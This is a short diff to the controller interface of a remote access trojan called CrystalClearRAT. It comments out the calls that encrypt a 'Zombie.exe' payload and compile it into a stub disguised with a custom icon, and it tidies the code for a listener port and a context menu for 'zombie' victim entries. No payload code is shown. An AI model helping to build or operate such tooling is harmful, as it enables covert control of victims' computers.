@@ -62,9 +62,9 @@ namespace CrystalClearRAT
         private void Grid_Loaded(object sender, RoutedEventArgs e)
         {
 
-            string payload = StubCompiler.EncryptPayload("Resources/Zombie.exe", "123");
+            //   string payload = StubCompiler.EncryptPayload("Resources/Zombie.exe", "123");
 
-            StubCompiler.Compile(payload, "icon.ico", "stub.exe");
+            //  StubCompiler.Compile(payload, "icon.ico", "stub.exe");
 
             //StubCompiler.Compile();
             // IconInjector.ChangeIcon("foo.exe", "icon.ico");
@@ -78,7 +78,7 @@ namespace CrystalClearRAT
 
             ContextMenu menu = (ContextMenu)item.FindResource("zombieContextMenu");
 
-            var zombie = ((ListViewItem)sender).Content as Zombie;
+            //  var zombie = ((ListViewItem)sender).Content as Zombie;
 
             menu.PlacementTarget = item;
             menu.IsOpen = true;
@@ -135,7 +135,7 @@ namespace CrystalClearRAT
             }
         }
 
-        private void listeningButton_Click(object sender, RoutedEventArgs e)
+        private void ListeningButton_Click(object sender, RoutedEventArgs e)
         {
 
             if (listening)
@@ -147,9 +147,8 @@ namespace CrystalClearRAT
             else
             {
 
-                int port;
 
-                if (int.TryParse(portTextBox.Text, out port))
+                if (int.TryParse(portTextBox.Text, out int port))
                 {
                     listening = true;
                     listeningButton.Content = "Stop Listening";
